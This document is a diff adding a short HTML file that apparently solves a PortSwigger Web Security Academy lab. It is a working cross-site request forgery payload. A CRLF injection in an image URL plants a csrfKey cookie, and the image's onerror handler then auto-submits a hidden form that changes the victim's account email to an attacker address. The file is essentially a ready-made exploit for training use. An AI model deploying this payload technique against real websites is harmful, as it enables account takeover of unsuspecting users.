@@ -1,0 +1,15 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Document</title>
+</head>
+<body>
+    <form action="https://0aec00cb04c2b8b283bbb4f80032005b.web-security-academy.net/my-account/change-email" method="POST">
+        <input type="hidden" name="email" value="pwned12345@evil-user.net" />
+        <input required type=hidden name=csrf value=KO7UfrcMkWIZ879uWZrO0jwY5cQaKFFL>
+    </form>
+    <img src="https://0aec00cb04c2b8b283bbb4f80032005b.web-security-academy.net/?search=test%0D%0ASet-Cookie:%20csrfKey=pILLZs82Jpcsgl3ikzWLXk2eap0gtNv5;%20SameSite=None;" onerror="document.forms[0].submit()">
+</body>
+</html>
